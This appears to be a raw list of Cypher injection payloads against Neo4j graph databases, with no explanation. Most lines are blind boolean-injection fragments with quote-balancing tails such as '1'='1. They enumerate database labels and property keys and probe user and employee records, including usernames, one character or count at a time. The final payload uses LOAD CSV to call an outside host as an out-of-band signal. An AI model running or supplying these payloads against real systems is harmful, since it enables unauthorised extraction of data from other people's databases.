MATCH (n:Person)-[:FRIENDS_WITH]->(m:Person)
WHERE n.name = 'Alice'
RETURN m.name

MATCH (n:Person)-[:FRIENDS_WITH]->(m:Person)
WHERE n.name = 'Alice' AND head(db.labels(n)) = 'test'
RETURN m.name

MATCH (n:Person)-[:FRIENDS_WITH]->(m:Person)
WHERE n.name = 'Alice' AND left(head(db.labels(n)), 1) = 't'
RETURN m.name

MATCH (n:Person)-[:FRIENDS_WITH]->(m:Person)
WHERE n.name = 'Alice' AND substring(head(db.labels(n)), 1, 2) = 'te'
RETURN m.name

MATCH (n:Person)-[:FRIENDS_WITH]->(m:Person)
WHERE n.name = 'Alice' AND EXISTS {CALL {WITH n MATCH (n) RETURN head(labels(n))} WHERE head(labels(n)) STARTS WITH 't'}
RETURN m.name

MATCH (n:Person)-[:FRIENDS_WITH]->(m:Person)
WHERE n.name = 'Alice' AND substring(labels(n)[0], 0, 2) = 'te'
RETURN m.name

MATCH (n:Person)
WHERE n.name = 'Alice' AND EXISTS {
  CALL {
    WITH 1 AS one
    RETURN one
  }
}
RETURN n.name

CALL {
  WITH count(db.labels()) AS numLabels
  RETURN numLabels >= 10 AS labelCountIsGreaterOrEqual
}

CALL db.labels() YIELD label
WITH label
SKIP 1
LIMIT 1
WITH 1 AS one
RETURN one

AND EXISTS { CALL db.labels() YIELD label WITH label SKIP 1 LIMIT 1 WITH label as l RETURN l}

AND EXISTS { CALL db.labels() YIELD label WITH label SKIP 0 LIMIT 1 WITH label as l WHERE l = 'test' RETURN l}

COUNT { CALL db.labels() YIELD label RETURN label} = 2

AND EXISTS { WITH 1 as one where one = 2 RETURN one }

and exists { call db.labels() yield label with label skip 0 limit 1 where substring(label,0,1) = 'u' return label}

and count{call db.propertyKeys() yield propertyKey with propertyKey return propertyKey} = 6 and not '1'='2

and count {match(u:employee) call db.propertyKeys() yield propertyKey with propertyKey where not isEmpty(u[propertyKey]) with distinct propertyKey skip 0 limit 1 where substring(propertyKey,0,1)='n' return propertyKey} = 1

and count {MATCH (t:employee) return keys(t)} = 5

and exists {MATCH (t:user) where size(keys(t)[0]) = 8 return keys(t)}

and count {MATCH (t:user) unwind keys(t) as key with key, t where key = 'username' return t[key]} = 2

and exists {MATCH (t:user) unwind keys(t) as key with key, t  where key = 'username' with t,key skip 0 limit 1 where size(toString(t[key])) > 0 return t[key]}

and exists { call {match(t:user) call db.propertyKeys() yield propertyKey with propertyKey where not isEmpty(t[propertyKey]) with distinct propertyKey return propertyKey } with propertyKey skip 1 limit 1 return propertyKey} and 2=2 and case when 2 = 2 then true else false end  and '1'='1

and case when count { call {match(t:user) call db.propertyKeys() yield propertyKey with propertyKey where not isEmpty(t[propertyKey]) with distinct propertyKey return propertyKey } with propertyKey return propertyKey} = 1 then exists {load csv from 'http://28357ad847461b9ded7fe68df351b98eaaa.test.com/' as csv_test} else false end and '1'='1
